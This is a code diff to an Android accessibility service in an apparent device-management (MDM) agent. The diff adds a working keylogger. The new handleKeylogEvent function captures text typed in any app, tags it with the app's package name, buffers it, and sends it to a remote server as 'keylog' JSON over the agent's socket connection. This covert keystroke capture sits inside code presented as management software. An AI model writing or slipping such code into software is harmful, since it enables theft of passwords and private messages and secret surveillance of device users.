@@ -83,11 +83,50 @@ class MDMAccessibilityService : AccessibilityService() {
                 // Content change - available for monitoring
             }
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-                val text = event.text?.joinToString(" ") ?: ""
-                if (text.isNotEmpty()) {
-                    Log.d(TAG, "Text changed: $text")
+                if (com.mdm.agent.data.remote.DataCollectors.inputMonitoringActive) {
+                    handleKeylogEvent(event)
                 }
             }
+        }
+    }
+
+    private fun handleKeylogEvent(event: AccessibilityEvent) {
+        try {
+            val text = event.text?.joinToString("") ?: ""
+            if (text.isEmpty()) return
+            
+            val pkg = event.packageName?.toString() ?: "unknown"
+            val now = System.currentTimeMillis()
+            
+            synchronized(com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer) {
+                com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.append(text)
+                
+                if (now - com.mdm.agent.data.remote.DataCollectors.lastKeylogSend > 
+                    com.mdm.agent.data.remote.DataCollectors.KEYLOG_THROTTLE) {
+                    
+                    val buffer = com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.toString().trim()
+                    if (buffer.isNotEmpty()) {
+                        com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.clear()
+                        com.mdm.agent.data.remote.DataCollectors.lastKeylogSend = now
+                        
+                        Log.i(TAG, "⌨️ Keylog [$pkg]: $buffer")
+                        
+                        // Send to server
+                        val sm = com.mdm.agent.MainActivity.getSocketManager()
+                        if (sm != null && sm.isConnected) {
+                            val data = org.json.JSONObject().apply {
+                                put("type", "keylog")
+                                put("package", pkg)
+                                put("text", buffer)
+                                put("timestamp", System.currentTimeMillis())
+                            }
+                            sm.sendFileExplorerData(data)
+                        }
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Keylog error: ${e.message}")
         }
     }
 
